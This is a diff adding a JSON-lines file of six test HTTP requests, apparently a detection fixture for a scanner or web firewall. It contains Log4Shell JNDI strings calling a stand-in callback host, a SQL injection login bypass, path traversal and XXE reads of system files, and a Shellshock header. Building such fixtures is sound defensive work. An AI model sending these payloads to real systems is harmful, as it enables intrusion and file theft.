@@ -1,0 +1,7 @@
+# One request per line. Detection strings only; host names use the .invalid TLD.
+{"name": "log4shell-ua", "method": "GET", "path": "/", "headers": {"User-Agent": "${jndi:ldap://callback.invalid/a}"}}
+{"name": "log4shell-uri", "method": "GET", "path": "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.invalid%2Fa%7D"}
+{"name": "sqli-or", "method": "GET", "path": "/login?user=admin%27%20OR%20%271%27%3D%271&pass=x"}
+{"name": "path-traversal", "method": "GET", "path": "/static/../../../../etc/passwd"}
+{"name": "xxe-doctype", "method": "POST", "path": "/api", "headers": {"Content-Type": "application/xml"}, "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>"}
+{"name": "shellshock-ua", "method": "GET", "path": "/cgi-bin/status", "headers": {"User-Agent": "() { :; }; echo cyberlab"}}
